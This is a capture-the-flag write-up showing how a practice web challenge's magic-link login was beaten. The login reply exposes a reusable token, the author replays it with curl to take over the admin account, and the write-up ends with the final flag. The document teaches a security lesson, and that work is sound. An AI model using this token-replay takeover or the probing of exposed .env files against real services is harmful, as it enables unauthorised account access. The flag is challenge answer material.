# Magic Link 3 — Full Writeup

## Challenge Info
- **Name:** Magic Link 3  
- **Category:** Web  
- **Target:** `https://bluehens-magic-link.chals.io`  
- **Flag format:** `udctf{...}`

---

## 1) Initial Recon

I started by loading the homepage and checking what endpoints exist.

```bash
curl -i -s https://bluehens-magic-link.chals.io/
The page showed a simple magic link login form that sends:

POST /login with email in form-data.
Then I checked robots.txt:

curl -i -s https://bluehens-magic-link.chals.io/robots.txt
It revealed interesting routes:

/inbox
/dashboard
/.env
I also checked /.env and found useful hints (usernames/tokens), but that value was not the final accepted flag for this challenge instance.

2) Understanding the Login Flow
From the frontend script, login works like this:

Send email to /login
Server returns JSON response
User is expected to use a magic-link-like value to authenticate
So I tested /login directly:

curl -i -s -X POST https://bluehens-magic-link.chals.io/login -F "email=admin@udctf.com"
Response returned JSON with a uuid, for example:

{
  "message":"Magic link generated, check your email.",
  "uuid":"HuXxikzbDk9eeXv90217sQ",
  ...
}
This was the key.

3) Route Discovery for Verification
I tested common verification endpoints (/verify, /magic, etc.) and found one important behavior:

GET /login/<uuid> is a valid route
If UUID is valid, server responds with:
302 -> /dashboard
Set-Cookie: session=...
So I used the returned admin UUID:

curl -i -s -c admin_cjar.txt -b admin_cjar.txt \
  "https://bluehens-magic-link.chals.io/login/HuXxikzbDk9eeXv90217sQ"
That set an authenticated session for admin@udctf.com.

4) Accessing the Flag
With the authenticated cookie jar, I requested dashboard:

curl -i -s -b admin_cjar.txt "https://bluehens-magic-link.chals.io/dashboard"
The response contained:

<h1>Welcome Admin</h1><p>Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}</p>
5) Why This Worked (Vulnerability)
The app had a broken magic-link design:

/login exposed a usable UUID directly in API response.
/login/<uuid> accepted it as authentication proof and created a session.
This allowed direct account takeover if you request a UUID for any email (including admin).
In short: magic link token was disclosed and directly replayable.

Final Flag
udctf{y0u_4r3_m4g1c_l1nk_m4st3r}
